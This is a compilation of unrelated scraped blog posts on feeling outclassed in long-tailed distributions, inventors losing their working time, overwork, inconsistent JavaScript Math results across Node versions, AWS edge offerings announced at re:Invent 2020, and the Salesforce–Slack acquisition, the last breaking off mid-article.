<p>Now, “feeling like a loser” sounds pretty justified. But that doesn’t make the feeling go away. So what should we call it?</p>

<p>Let’s call it “feeling the tail” instead (like “feeling the burn,” but more abstract). By “tail,” I’m referring to the “right side” of Figures 1 and 2, i.e., the part where the curve tapers off. (In Figure 1, the tail is roughly 85-100; in Figure 2, it’s 5-110). Thinking that you’re far from the tip makes sense: real-world distributions have <a href="https://en.wikipedia.org/wiki/Long_tail">longer tails</a> than normal distributions.</p>

<p>When you accomplish something (e.g., get hired, receive new responsibilities, become an NBA All-Star), you’re now competing with a new set of people — people who have also accomplished this thing. As you stand at the top of your new curve, on the skyscraper at “0” or “1,” you see the high-scorers, way out in the distance. “Who are these people, and how are their scores so high? Do I even belong here? Where are my fellow low-scorers?” Lost and afraid on this curve, you feel like a loser.</p>

<p>But don’t forget (cue the inspirational music) — you’re on this curve because you <em>accomplished</em> something. Becoming aware of those high-scorers means you’ve <em>progressed</em>. Maybe you can’t see them, but there are <em>lots</em> of people in a position similar to yours. So perhaps you shouldn’t feel like a loser — you’re just feeling the tail.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>How many of our greatest minds have we lost?</p>
<p>From The Dream Machine (p50) on John Atanasoff:</p>
<blockquote>
<p><strong>He was determined to build a computing machine… But with all his teaching responsibilities, he’d had very little time to focus on the problem.</strong> Finally, however, on a bitterly cold winter night in late 1937, he just couldn’t take it anymore; he had to get away to concentrate. So he jumped into his car in Ames, Iowa, and drove east through the subzero temperature at more than eighty miles per hour. Almost three hours later, after he crossed the Mississippi River into Illinois, he stopped at a roadhouse to warm up. And there, somewhere between his first and second bourbons, he conceived four crucial ideas to make him computer work.”</p>
</blockquote>
<p>Incredible! Atanasoff was busy, but finally got down to doing the thing he really loved, the world recognized his genius, and he was given all the resources he needed to complete his work.</p>
<p>At least, that’s what would have happened in any reasonable society. Instead, we’re told:</p>
<blockquote>
<p>Atanasoff didn’t develop his invention any further, as it happened. Soon after the United States entered the war, in December 1941, he went to the Naval Ordinance Laboratory in Washington, D.C., where he supervised the counting testing of mines. <strong>He never returned to computing.</strong></p>
</blockquote>
<p>Who knows what else he could have given us? Instead, his entire lifetime produces one brief period of real scientific producitivity, bookended by teaching responsibilities and war.</p>
<p>Once you start looking, these stories are everwhere. Here’s <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/History_of_Unix">The Daemon, the Gnu and the Penguin</a> on the invention of Unix:</p>
<blockquote>
<p>In August 1969, Ken Thompson’s wife Bonnie took their year-old son on a trip to California to show off to their families. As a temporary bachelor, Ken had time to work. “I allocated a week each to the operating system, the shell, the editor and the assembler [he told me]… and during the month she was gone, it was totally rewritten in a form that looked like an operating system”</p>
</blockquote>
<p>Maybe this is a greatly exaggerated myth, but how terrifying would it be if that was true? Is it possible that Thompson was burdened by responsibilities his entire life, and then in a brief moment of freedom did some of the most important work anyone has ever done?</p>
<p>And then from <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wright_brothers#Wilbur">Wikipedia</a>, on Wilbur Wright:</p>
<blockquote>
<p>…Wilbur never flew again. He gradually became occupied with business matters for the Wright Company and dealing with different lawsuits. Upon dealing with the patent lawsuits, which had put great strain on both brothers, Wilbur had written in a letter to a French friend, “<strong>When we think what we might have accomplished if we had been able to devote this time to experiments, we feel very sad</strong>, but it is always easier to deal with things than with men, and no one can direct his life entirely as he would choose.”</p>
</blockquote>
<p>But why on earth not? Why couldn’t Wilbur Wright, now admired as one of history’s greatest investors, find time to continue his most important work? The story continues:</p>
<blockquote>
<p>Wilbur spent the next year before his death traveling, where he spent a full six months in Europe attending to various business and legal matters… He was also constantly back and forth between New York, Washington and Dayton. All of the stresses were taking a toll on Wilbur physically. Orville would remark that he would “come home white”.</p>
</blockquote>
<p>Then finally:</p>
<blockquote>
<p>After returning to Dayton in early May 1912, worn down in mind and body, he fell ill again and was diagnosed with typhoid fever. He lingered on, his symptoms relapsing and remitting for many days. Wilbur died, at age 45, at the Wright family home on May 30.</p>
</blockquote>
<p>These were some of the most brilliant minds we had, and they were each nearly unable to fulfil even a tiny fraction of their potential. We should ask how much more each of them could have accomplished, but also how much we’ve lost from would-be inventors unable to find even a month of genuine free time with which to pursue their dreams. And of course, how many have been effectively barred from research by poverty or discrimination.</p>
<p>What hits me hardest is not the material loss, but the squandering of human spirit. As <a target="_blank" rel="noopener" href="https://vimeo.com/115154289">Bret Victor once explained</a>:</p>
<blockquote>
<p>We recognize that a dog has to be allowed the full free expression of its entire range of capabilities. Sticking him in a cage or constraining his range of experience, you’re not letting him do all the things that dogs can do. And this is exactly what we’ve done to ourselves.</p>
</blockquote>
<p>And so the stories above strike me not even as tragedies, but as something more inhumane.</p>
<p>My greatest fear is that intelligent life will arrive on earth. It won’t be an invasion, or colonization, or anything horrible. They’ll just sit us down, and ask about the lives of our heroes.</p>
<p>We’ll proudly tell them about this guy Wilbur Wright. How he and his brother invented a machine to fly in the sky as gods. We’ll tell them about our culture of research and innovation, and how Wilbur, self-taught engineer from Ohio, changed the entire world.</p>
<p>And then we’ll have to explain how gruesomely we murdered him.</p>
<p>Not with sticks and stones, but with a barrage of patent lawsuits. We will have to tell the aliens how we used this great system of socially legitimate torture to slowly wear him down over the years.</p>
<p>We will tell them how in the end, poor brilliant Wilbur became old and tired and incapable of producing anything beautiful ever again.</p>
<p>I do not think they will forgive us. I am not sure we should forgive ourselves.</p>
<hr>
<p><strong>See Also</strong><br><a target="_blank" rel="noopener" href="https://guzey.com/patronage-and-research-labs/">Reviving Patronage and Revolutionary Industrial Research</a></p>
<hr>
<p><em>Yes, I understand that Wilbur also sued people. I’m not claiming that he was a good person. My point is that in a humane world, no part of this story would even be possible.</em></p>

            <p>If you are feeling overwhelmed, and your first response to that is to work longer hours, you are doing it wrong.</p><p>What to do instead:</p><ol><li><strong>Find the most significant reason for being overwhelmed.</strong> Find the one thing that contributes to 80% (or most) of the workload stress. Classify that one thing as urgent, or critical, or none. Act accordingly.</li><li><strong>Set basic rules.</strong> I say no to all tasks that take up too much time but add significantly less value. I also adhere to a start and end time of my work-day; this is even more important during WFH.</li><li><strong>Don't be a hero.</strong> Don't take up more work than you should. Second - everything doesn't have to be perfect. As Sheryl Sandberg said, <em>"Done is better than perfect."</em> Answer this question to decide if you should put in more time or not: "What is the incremental value of spending more time on this task?"</li><li><strong>Delegate, whenever possible.</strong> Don't do tasks that don't deserve your time and attention. Yes, no job is too small, but some tasks are less critical and can be done by others. Identify such tasks, then find the right person to do it, and then delegate.</li><li><strong>Ask for help.</strong> There are more people than you think who are willing to help. All you need to do is ask.</li></ol>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a written version of a talk that I gave at <a href="https://wafflejs.com/">WaffleJS</a> in February, which itself was an expansion of a <a href="https://twitter.com/tmcw/status/1187782634623000576">Twitter conversation</a> from October.</em></p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.webp" type="image/webp"><img alt="Math education" src="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.jpg"></picture></p><p>Okay, so it starts with my delayed math education. As part of my Computer Science program, I had access to world-class math professors, access that I mostly wasted. I didn’t like math: the topics were so removed from practice, and I was already frustrated by the highly theoretical, and – I thought at the time and mostly still do – out-of-touch CS program.</p><p>Unfortunately, a few years after graduating, I got the hunger for math. Seeing how I could apply just a little bit of math knowledge to great effect in my work &amp; hobbies had me inspired. But I had no clear way of learning it.</p><p>So I <a href="https://macwright.com/2012/06/26/simple-statistics.html">started Simple Statistics in 2012</a> as a way to learn math, and ever since then, I’ve expanded and maintained the project. It now includes a lot of different algorithms, is one of the most ‘starred’ JavaScript math projects, and presumably is used by people.</p><p>But I started it in 2012. In tech years that’s a really long time ago. Between then and now, there have been 8 LTS releases of <a href="https://nodejs.org/en/">Node</a>. JavaScript and its environments have radically changed. 2012 was before the introduction of React or the first commit to Babel.</p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.webp" type="image/webp"><img alt="Time passing" src="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.jpg"></picture></p><p>So what I noticed over the years was that tests kept breaking when I updated Node. I’d have a test like:</p><div><div><pre><code><span>t</span><span>.</span><span>equal</span><span>(</span><span>ss</span><span>.</span><span>gamma</span><span>(</span><span>11.54</span><span>),</span> <span>13098426.039156161</span><span>);</span>
</code></pre></div></div><p>That would work in Node v10 and break in Node v12. And this is not some complex method: gamma is implemented with arithmetic, Math.pow, Math.sqrt, and Math.sin.</p><h3 id="arithmetic">Arithmetic</h3><p>So I know what you might be thinking: arithmetic. JavaScript, on Twitter, gets a lot of heat for this behavior:</p><div><div><pre><code>0.1 + 0.2 = 0.30000000000000004
</code></pre></div></div><p>As I wrote in <a href="https://macwright.com/2017/07/29/javascript-wats-dissected.html#numbers-are-weird">JavaScript wats, dissected</a>, this is the behavior of every popular programming language, even stodgy pedantic ones like Haskell. Floating point arithmetic might be weird, but it’s very consistent and well-specified: the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> specification is rigorously implemented. So it’s not arithmetic: addition, subtraction, division, and multiplication are pretty set in stone.</p><h3 id="math">Math</h3><p>What it was, was Math. In particular, all of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math">the methods that come after <code>Math.</code></a></p><p>Methods like Math.sin, Math.cos, Math.exp, Math.pow, Math.tan: <a href="https://macwright.com/2013/03/05/math-for-pictures.html">essential ingredients for geometry</a> and basic computation. I started isolating changes in basic function behavior between versions. For example:</p><p>Calculating Math.tanh(0.1)</p><div><div><pre><code>// Node 4
0.09966799462495590234
// Node 6
0.09966799462495581907
</code></pre></div></div><p>Calculating Math.pow(1/3, 3)</p><div><div><pre><code>// Node 10
0.03703703703703703498
// Node 12
0.03703703703703702804
</code></pre></div></div><p>To make matters worse, it’s not just Node’s behavior that’s changing: so are browsers and other places you use JavaScript.</p><p>So this led to the question: <strong>what is math?</strong></p><svg fill="none" viewBox="0 0 1105 572" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1105v572H0z" fill="#fff"></path><path d="M551.933 460.719c92.311 0

coordinates on the rim, and that they’ll draw little squigglies if plotted on X &amp; Y. Actually <em>deriving</em> those methods is what you’ll learn in advanced classes, but the method that you use - the <a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor series</a> - relies on an <em>infinite</em> series, which would be rather laborious for a computer to solve.</p><blockquote><p>“There is no standard algorithm for calculating sine. IEEE 754-2008, the most widely used standard for floating-point computation, does not address calculating trigonometric functions such as sine.”</p></blockquote><p>-<a href="https://en.wikipedia.org/w/index.php?title=Sine&amp;oldid=939445047#Software_implementations">Wikipedia</a></p><p>Computers use a variety of different estimations and algorithms to do math, things like <a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> and various cheating algorithms and lookup tables. This heterogeny explains all of the <a href="https://github.com/search?q=fastmath">‘fastmath’</a> libraries you can find on GitHub: there’s more than one way to implement Math.sin. Famously, Quake III Arena used a <a href="https://en.wikipedia.org/w/index.php?title=Fast_inverse_square_root&amp;oldid=940101226">faster replacement for the inverse square root method</a> in order to speed up rendering.</p><p>So math is implemented as algorithms, and there are multiple common algorithms –&nbsp;and variations of those algorithms –&nbsp;used in practice.</p><p>Instead of telling implementations to pick an algorithm, the JavaScript specification grants them a <em>lot</em> of wiggle room in terms of how they implement these basic functions.</p><blockquote><p>The behaviour of the functions acos, acosh, asin, asinh, atan, atanh, atan2, cbrt, cos, cosh, exp, expm1, hypot, log,log1p, log2, log10, pow, random, sin, sinh, sqrt, tan, and tanh is not precisely specified here except to require specific results for certain argument values that represent boundary cases of interest.</p></blockquote><p>-<a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-function-properties-of-the-math-object">ECMA-262, 10th edition, section 20.2.2 aka “JavaScript”</a></p><p>I don’t know the inner workings of the standards committees, but I imagine they wanted to make sure that just in case Intel or AMD introduce super-fast new math instructions in a new processor, JavaScript wouldn’t have a compatibility crisis.</p><p>Because there are a lot of JavaScript interpreters that are commonly used, because JavaScript is often used via web browsers and there still is some competition between web browsers, and because even popular JavaScript implementations are under pressure to evolve quickly to be the most performant…&nbsp;because of all that, this matters. You actually will encounter, on a regular basis, differences in math.</p><p>This doesn’t matter as much in other interpreted languages, because they tend to have ‘canonical’ interpreters: most of the time you use the Python interpreter of the Python language.</p><h3 id="where-math-happens">Where math happens</h3><p>Next let’s zoom into <em>where</em> these math implementations live. See, in JavaScript, there are three places where basic math can happen:</p><ol><li>The CPU</li><li>The language interpreter (the C++ and C code that underlies JavaScript implementations)</li><li>In software itself, as a library</li></ol><p><strong>1: The CPU</strong></p><p>This was my first guess: I assumed that since CPUs implement arithmetic, they might implement some higher-level math. It turns out that CPUs do have instructions to do trigonometry and other operations, but they’re rarely invoked. The CPU (x86) implementation of sine doesn’t get much love because it’s not reliably faster than an implementation in software (using arithmetic operations on the CPU), nor as accurate.</p><p>Intel also bears some blame for <a href="https://randomascii.wordpress.com/2014/10/09/intel-underestimates-error-bounds-by-1-3-quintillion/">overstating the accuracy of their trigonometric operations</a> by many magnitudes. That kind of mistake is especially tragic because, unlike software, you can’t patch chips.</p><p><strong>2: The language interpreter</strong></p><p>This is how most of the implementations do it, and they implement math in a variety of ways.</p><ul><li>V8 &amp; SpiderMonkey use (slightly different) ports of the <a href="https://www.netlib.org/fdlibm/">fdlibm</a> library for most operations. It has been passed down through the generations, originally written at Sun Microsystems.</li><li>JavaScriptCore (Safari) uses cmath for most operations.</li><li>Internet Explorer used some cmath, but <a href="https://github.com/microsoft/ChakraCore/blob/d86452259dd534718b7eb9ce024ed35aefd33036/lib/Runtime/Library/MathLibrary.cpp#L1028-L1047">also used some assembly instructions and actually <em>did</em> use CPU-provided trig methods</a> when it was compiled for CPUs that had them.</li></ul><p>Historically, all of these implementations have shifted: V8 used to use a homegrown solution for math, and then used <a href="https://github.com/v8/v8/blob/ff7975aa8d1ff6f0904f0f5112d17ea819466983/src/math.js">a port of fdlibm to JavaScript</a>, before finally settling on fdlibm in C.</p><h3 id="why-this-is-an-issue">Why this is an issue</h3><p>Here’s why this is a problem: it chips away at JavaScript’s ability to give consistent results to any problem including mathematics. And that especially hits <em>data science</em>. I want JavaScript to be a contender for data science in the browser, and – amongst some other issues, like number types and a confounding lack of a commonly-used data-frames library –&nbsp;an inability to produce replicable results means adding more crisis to the <a href="https://en.wikipedia.org/wiki/Replication_crisis">replication crisis</a> in the sciences.</p><h3 id="the-third-way">The third way</h3><p>There is a way out that we can use today. <a href="https://github.com/stdlib-js/stdlib">stdlib</a> is a JavaScript library that reimplements higher-level math using arithmetic alone. Arithmetic is fully-specified and standard, so the results that stdlib gives you are also fully consistent, across all the platforms.</p><p>This comes at the cost of complexity and speed: stdlib isn’t consistently as fast as built-in methods, and you’ll need to require a library ‘just’ to compute sine.</p><p>But in the wider view, this is pretty normal! WebAssembly, for example, doesn’t give you higher-level math methods at all and recommends you include a math implementation in your modules themselves:</p><blockquote><p>“WebAssembly doesn’t include its own math functions like sin, cos, exp, pow, and so on. WebAssembly’s strategy for such functions is to allow them to be implemented as library routines in WebAssembly itself (note that x86’s sin and cos instructions are slow and imprecise and are generally avoided these days anyway).”</p></blockquote><p>And this is the way that compiled languages have always worked: when you compile a C program, the methods you import from <code>math.h</code> are included in the compiled binary.</p><h3 id="using-an-epsilon">Using an epsilon</h3><p>If you don’t want to include stdlib to do math but you do want to test math-heavy code, you’ll probably have to do what simple-statistics does right now: use an epsilon. Of the <a href="https://en.wikipedia.org/w/index.php?title=Epsilon&amp;oldid=938802001#Symbol">5+ uses of epsilon in math</a>, the one I’m referring to is “an arbitrarily small positive quantity”. It’s a tiny number. Here’s <a href="https://github.com/simple-statistics/simple-statistics/blob/727eaed049af4f788fb2299e5c8263573618e78c/src/epsilon.js#L35">simple-statistics’s implementation</a>: the number 0.0001.</p><p>You then compare <code>Math.abs(result - expected) &lt; epsilon</code> to make sure you got within range of the desired value, with a little bit of wiggle room.</p><h3 id="the-moral-of-the-story">The moral of the story</h3><p>Here’s where I was a little short on time in person and have some room to expand.</p><p><em>First, what’s under the hood is rarely what you expect.</em> Our current tech stack is heavily optimized and a lot of optimizations are really just dirty tricks. For example, the number of hardware instructions it takes to solve <code>Math.sin</code> varies based on the input, because there are lots of special cases. When you get to more complex cases, like ‘sorting an array’, there are often multiple algorithms that the interpreter chooses between in order to give you your final result. Basically, the cost of anything you do in an interpreted language is variable.</p><p><em>Second, don’t trust the system too much.</em> What I was seeing between Node versions really <em>should</em> have been a bug in the testing library, or something in my code, or maybe in simple-statistics itself. But in this case, digging deeper revealed that what I was seeing was exactly what you don’t expect: a glitch in the language itself.</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- ## AWS re:Invent 2020 Day 2: AWS is coming to a data center (or pizza parlor) near you! -->
<p>Day 2 of re:Invent 2020 brought no new releases or announcements, so in this article we will dive into another few releases from re:Invent day 1. They relate to a movement that has been going on for a while now; AWS is bringing their services closer to their users, into private data centers, 5G edge locations, hotels, and even other clouds!</p>
<h3>Outposts, Local Zones and Wavelength</h3>
<p>In 2019 AWS announced general availability of <a rel="noopener noreferrer" href="https://aws.amazon.com/Outposts/">Outposts</a>, launched the first <a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/global-infrastructure/localzones/">Local Zone</a> in Los Angeles, and introduced <a rel="noopener noreferrer" href="https://aws.amazon.com/wavelength/">Wavelength</a>. These three services / deployments have different characteristics, but they follow the same concept: they allow AWS services to run outside a full-fledged AWS region.</p>
<p>At their introduction, AWS Outposts were only available as full 42-unit racks that can be installed in data centers or office locations. These racks contain networking equipment, power supplies, storage, and one or more physical servers, for example a <code>c5.24xlarge</code> or even ten <code>r5d.24xlarge</code> hosts. These can run AWS services like EC2, RDS, ALB and S3. The two main use cases for Outposts are low latency and data residency. However, this comes at a cost: the cheapest 42U outpost is listed at $118,110.21 and the most expensive one costs a whopping $776,478.32 for a three-year period.</p>
<p>Contrary to Outposts, Local Zones are hosted in data centers owned and managed by AWS. They are much like a single availability zone, connected to a nearby region. However, where normal availability zones are located close together to achieve minimal latencies between them, Local Zones are located near densely populated areas (like LA) to achieve the lowest latency to that area.</p>
<p>Wavelength is a bit of a crossover implementation, where AWS deploys and maintains hardware in data centers owned by 5G telecom operators. These data centers are also located in or near dense urban areas, which again leads to reduced latency for these areas.</p>
<p>These three relatively new solutions have one thing in common: they bring AWS services that are historically limited to AWS regions outside of those regions to reduce latency. This also allows AWS to scale faster than by just adding new regions (which they are also doing, in India, Indonesia, Japan, Spain, and Switzerland).</p>
<h3>New announcement: 15 new Local Zones</h3>
<p>At re:Invent 2020, AWS announced (<a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/whats-new/2020/12/announcing-preview-of-aws-local-zones-in-boston-houston-and-miami/">AWS News</a> - <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/in-the-works-more-aws-local-zones/">AWS Blog</a>) that they will be adding three new Local Zones in 2020 (Boston, Houston, and Miami) . In 2021, these will be joined by another twelve local zones, among which New York City, Chicago, and Atlanta.</p>
<p>These Local Zones allow ultra-low latency for short-distance communications, for example used in gaming, financial markets, video conferencing or live sports matches.</p>
<h3>New announcement: 1U and 2U Outposts</h3>
<p>AWS also <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/reinvent-2020-preannouncements-for-tuesday-december-1/">pre-announced</a> smaller form factor Outposts. As described in the introduction, the previous smallest form factor was 42U. In 2021, Outposts will also become available in single server format: either a 1U server based on a Graviton 2 ARM CPU or a 2U Intel-based server.</p>
<p>This allows AWS customers to place Outposts in location where there is no room for a full rack, or where a full rack would simply be overkill. This might include hotels or restaurants, but also distribution centers, train stations, and whichever other place might benefit from local EC2 compute capacity. And of course, smaller Outposts will be more affordable, reducing the barrier to get started.</p>
<h3>New announcements: ECS Anywhere, EKS Anywhere, and EKS Distro (EKS-D)</h3>
<p>The Outposts, Local Zones and Wavelength technologies are all focused on hardware: actual physical devices that are installed in various locations by AWS.</p>
<p>A number of announcements on the software side are even more interesting: AWS will make the container orchestration software used in ECS and EKS available for, well, anywhere (<a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/reinvent-2020-preannouncements-for-tuesday-december-1/">AWS News</a>), and they have open sourced the Linux distribution used in EKS and named it EKS-D (<a rel="noopener noreferrer" href="https://aws.amazon.com/about-aws/whats-new/2020/12/introducing-amazon-eks-distro/">AWS News</a> - <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/amazon-eks-distro-the-kubernetes-distribution-used-by-amazon-eks/">AWS Blog</a> - <a rel="noopener noreferrer" href="https://github.com/aws/eks-distro">GitHub</a>).</p>
<h4>Why it matters</h4>
<p>Releasing ECS Anywhere, EKS Anywhere and EKS-D is a big deal. For the first time, you can get started with these trusted and proven container orchestration layers without paying for AWS instances, and at whatever location you prefer (including Google Cloud, Azure or any other public cloud provider). But why, you might ask, would you want to?</p>
<p>The answer lies in use cases where customers already have their own hardware in data centers or office locations. Most companies aren’t “born in the cloud”. They have existed for years or decennia, and have invested large sums of money in their IT infrastructure. Actually, they still are investing in their on-premises IT infrastructure, as this slide from Andy Jassy’s keynote shows:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5cm0AjrbdFgIxvEI6gJtoJ/b9fdf70784d8ed617a0b8c7a9ef2215c/early-days.jpg?fit=scale&amp;w=920" alt="Early Days"></p>
<p>These companies are reluctant to just throw away this enormous capital investment and switch over to a public cloud operational expense model. Running ECS or EKS on their own hardware offers the following benefits:</p>
<p><strong>1. Increased integration</strong><br>
With ECS or EKS in your own data center, you can run exactly the same platform locally as in an AWS region. ECS is famous for its tight integration with services like IAM. With ECS and EKS Anywhere you can benefit from this tight integration on your existing hardware. This also increases portability of workloads between your own data center and AWS.</p>
<p><strong>2. Lower cost</strong><br>
As we saw earlier with Outposts, purchasing hardware to run AWS locally is very expensive. However, if you can use your existing hardware, the cost of running a workload locally can actually be lower than it running in the cloud.</p>
<p><strong>3. Lower latency</strong><br>
The recurring theme in this article is low latency. If you want the highest performance and the quickest responses from your applications, you will need to run it as closely to the end user as possible. With ECS and EKS Anywhere you can use your existing close-to-the-user hardware for workloads that are tightly integrated with AWS.</p>
<p><strong>So what’s in it for AWS?</strong><br>
With all these benefits, it seems like AWS is cannibalizing their own product. After all, why would you pay for EC2 instances (on which AWS is making healthy margins) if you can use your own hardware? But let’s turn this argument around: if you already have your own hardware, you might not move to the cloud at all. When a company doesn’t move to the cloud, AWS literally has zero revenue from it. By providing ECS and EKS control planes for free, it can act as a gateway into many other services, like S3, DynamoDB, RDS, and so on. And once you get a taste for it…</p>
<h3>Conclusion</h3>
<p>With Outposts, Local Zones, Wavelength, EKS Anywhere, ECS Anywhere and EKS-D, Amazon is spilling their services out like oil. Obviously, other cloud providers are working extremely hard to catch up with AWS, and while they still maintain a healthy lead AWS has to keep reinventing their business model. It’s good to see that they dare to take some risk by releasing some of their big money makers for free. I wouldn’t be surprised if Amazon would drop the cost for EKS completely, sometime soon. After all, Azure AKS and Google Anthos are already free.</p>

<p><em>“Combining Slack with Salesforce Customer 360 will be transformative for customers and the industry. The combination will create <strong>the operating system for the new way to work</strong>, uniquely enabling companies to grow and succeed in the all-digital world.”</em> (<a href="https://investor.salesforce.com/press-releases/press-release-details/2020/Salesforce-Signs-Definitive-Agreement-to-Acquire-Slack/default.aspx">link</a> – has the “operating system for x” analogy/strategy ever worked?)</p>



<p><em>“We’re going to help them to <strong>just</strong> <strong>redefine the entire industry</strong>,” Benioff said of Slack during a conference call with analysts. “When the moment and the opportunity arises, you have to look and ask yourself, are you strong? Can you do something like this? Or are you weak? Or is it a moment where you just don’t have the swagger?”</em> (<a href="https://finance.yahoo.com/news/salesforce-benioff-escalates-microsoft-rivalry-050100329.html">link</a> – too little swagger likely the least of their problems…)</p>



<p><em>“What this is all about is <strong>the value of the social enterprise</strong>,” Benioff said on a call with analysts after the announcement, “And creating this incredible idea that you have <strong>this amazing hub of productivity, of collaboration and integration and applications</strong> <strong>that now leverage all this amazing data</strong>.”</em> (<a href="https://www.businessinsider.com/salesforce-marc-benioff-acquiring-slack-brings-collaboration-vision-to-life-2020-12">link</a> – “x but for the enterprise” has a decidedly mixed record, but we’re long past the window when copying and pasting “social” into the enterprise might have seemed like an unequivocally positive thing)</p>



<p><em>“<strong>This moment is one we will remember a couple decades from now</strong>,” Slack CEO Stewart Butterfield said Wednesday during an appearance at Salesforce’s annual user conference. He <strong>likened the deal to the debut of Microsoft’s Windows 95 and the emergence of the cloud</strong>. “This is a pivotal moment and the opportunity to really transform the way that we work so we’re not relying on the physical office, so we can have a digital HQ,” Butterfield said.</em> (<a href="https://finance.yahoo.com/news/salesforce-benioff-escalates-microsoft-rivalry-050100329.html">link</a> – did he say this with a straight face?)</p>


<p>Salesforce’s announcement it is acquiring Slack was just what you’d expect from a company that spends over 46 cents of every revenue dollar on marketing:</p>


<figure><img loading="lazy" width="850" height="500" src="https://www.platformonomics.com/wp-content/uploads/2020/12/image-8.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2020/12/image-8.png 850w, https://www.platformonomics.com/wp-content/uploads/2020/12/image-8-300x176.png 300w, https://www.platformonomics.com/wp-content/uploads/2020/12/image-8-768x452.png 768w" sizes="(max-width: 850px) 100vw, 850px"></figure>



<p>If there was a Magic Quadrant for Marketing Hyperbole, Swagger and Tchotchkes, Salesforce would occupy the highest and rightmost position in the entire history of Magic Quadrants. They would just redefine the entire Magic Quadrant in amazing ways (their language is remarkably Trumpian – just need ALL CAPS and a few typos…).</p>



<p>But the extravagant rhetoric did distract from several harsh realities:</p>



<h2><strong>REALITY #1: SALESFORCE HAS BECOME A FINANCIAL ROLLUP</strong></h2>



<p>Salesforce has become a financial play that is dependent on buying revenue to keep up its growth  and thereby valuation. The incremental revenue from Tableau just rolled off, so Salesforce’s <a href="https://www.theinformation.com/articles/salesforce-pays-up-for-slack-the-informations-tech-briefing">growth rate dropped</a> in the quarter that was coincidentally reported concurrent with the acquisition announcement. And they are forecasting their <a href="https://markets.businessinsider.com/news/stocks/salesforce-q3-earnings-stock-price-slack-deal-weak-growth-guidance-2020-12-1029858085">slowest growth</a> since 2009 next quarter. Hence it is time for another deal. Timing may take precedence over price or strategic plausibility.</p>



<h2><strong>REALITY #2: THIS IS A VERY, VERY EXPENSIVE ACQUISITION</strong></h2>



<p>Salesforce is paying 33 times Slack’s TTM (trailing twelve month) revenue (as of the Dec 2 close). Salesforce itself trades below 10 times TTM revenue. Even the untethered to reality Telsa only trades at 19 times TTM revenue. They are paying a premium of over 50% relative to where Slack’s stock was trading before the deal leaked (which is spectacular for Slack shareholders). $27.7 billion is an awful lot to pay for IRC chat, without competitive video or audio, and not much of a developer platform. Wall Street, who can usually rationalize any valuation, are <a href="https://www.marketwatch.com/story/salesforce-stock-drops-as-wall-street-questions-necessity-of-slack-purchase-11606930849">questioning</a> the price (and the strategic rationale). As Salesforce’s stock <a href="https://techcrunch.com/2020/12/02/salesforce-slumps-8-5-as-its-post-slack-selloff-continues/">wilts</a> due to a lack of enthusiasm in some circles for the deal, it becomes a bigger and bigger transaction for them, making it even harder to pay off. With Salesforce’s valuation down ~$35 billion since it leaked, this deal might not get consummated (Benioff previously backed off buying Twitter when investors failed to share his enthusiasm).</p>



<p>There are many better discussions of the financial aspects of this deal, but the key point is it is priced for absolute perfection. That means, among other things, they will have to generate a lot of revenue from Slack and can’t just give it away for free to existing customers to claim victory.</p>



<h2><strong>REALITY #3: SALESFORCE HAS A TERRIBLE RECORD AT INTEGRATING ACQUIRED PRODUCTS</strong></h2>



<p>Salesforce has bought a lot of companies (<a href="https://finance.yahoo.com/news/salesforce-benioff-escalates-microsoft-rivalry-050100329.html">60+</a>), but has struggled to integrate them at the product level, or consolidate them onto a common platform. They even bought an integration product (Mulesoft), but it hasn’t helped. The glass-half-full take  is they have let their acquisitions “be” and instead focused on selling the hell out of each product (and Salesforce can sell if nothing else) versus integrating across the portfolio. But once under the Salesforce umbrella, product roadmaps evolve on geologic time.</p>



<p>Letting Slack just “be” is not an option for this deal, as the entire premise is Slack will be threaded through everything and provide a coherence across the entire Salesforce portfolio that has never existed. They even <a href="https://investor.salesforce.com/press-releases/press-release-details/2020/Salesforce-Signs-Definitive-Agreement-to-Acquire-Slack/default.aspx">see</a> it as the common thread for <strong>all</strong> other business apps:</p>



<blockquote><p>“As the new interface for Salesforce Customer 360, Slack will transform how people communicate, collaborate and take action on customer information across Salesforce as well as information from all of their other business apps and systems to be more productive, make smarter, faster decisions and create connected customer experiences.”</p></blockquote>



<p>This is a big ambition for a company that has consistently struggled to do this kind of engineering (this is a company that is in its second decade of trying to figure out how to get off Oracle). Lets call it a major risk factor. Lets call it a major potential distraction from the real prerequisite for this vision, which is a singular, underlying data platform.</p>



<p>Benioff even almost <a href="https://www.businessinsider.com/salesforce-marc-benioff-acquiring-slack-brings-collaboration-vision-to-life-2020-12">acknowledges</a> they have not had the technical wherewithal to make this supposedly long-held vision real (but expects a couple of new hires will single-handedly get it done…):</p>



<blockquote><p>“I can’t even think about how many conversations Parker [Harris] and I have had on this vision,” Benioff said, “And then to see Stewart come in with Bret and make it all real. Well, that’s just awesome.”</p></blockquote>



<p>Salesforce seems to be hoping an IRC chat company can build out a broad enterprise platform for them, because they have not been able to do it themselves.</p>



<h2><strong>REALITY #4: SALESFORCE IS NEITHER A BEAR NOR AN ALLIGATOR (MORE LIKE AMWAY)</strong></h2>



